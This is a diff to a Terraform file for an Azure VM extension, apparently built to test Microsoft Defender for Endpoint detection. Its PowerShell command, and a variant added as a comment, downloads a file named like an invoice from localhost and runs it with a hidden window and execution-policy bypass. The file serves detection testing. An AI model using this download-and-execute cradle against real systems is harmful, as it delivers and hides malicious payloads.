@@ -515,7 +515,9 @@ resource "azurerm_virtual_machine_extension" "mde_test_windows" {
 
   settings = <<SETTINGS
  {
-  "commandToExecute": "powershell -ExecutionPolicy Unrestricted -Command {(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe','C:\\Temp\\invoice.exe'); Start-Process 'C:\\Temp\\invoice.exe' }" 
+  "commandToExecute": "powershell -NoExit -ExecutionPolicy Bypass -WindowsStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe','C:\\Temp\\invoice.exe'); Start-Process 'C:\\Temp\\invoice.exe'" 
  }
 SETTINGS
 }
+
+# powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe'); Start-Process 'C:\\test-MDATP-test\\invoice.exe'
